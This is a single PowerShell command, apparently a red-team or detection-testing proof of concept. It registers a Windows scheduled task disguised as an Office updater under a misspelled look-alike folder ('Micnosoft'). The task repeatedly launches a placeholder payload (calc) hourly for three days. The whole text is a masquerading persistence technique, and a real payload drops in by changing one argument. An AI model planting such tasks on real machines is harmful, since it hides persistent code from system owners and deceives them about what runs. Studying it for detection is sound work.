Register-ScheduledTask 
-TaskName 'Office Feature Updates Helper' 
-TaskPath '\Micnosoft\Office\'  
-Action (New-ScheduledTaskAction -Execute 'powershell' -Argument 'calc') 
-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries) 
-Trigger (New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(5).ToString("MM/dd/yyyy hh:mm:ss")) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3))
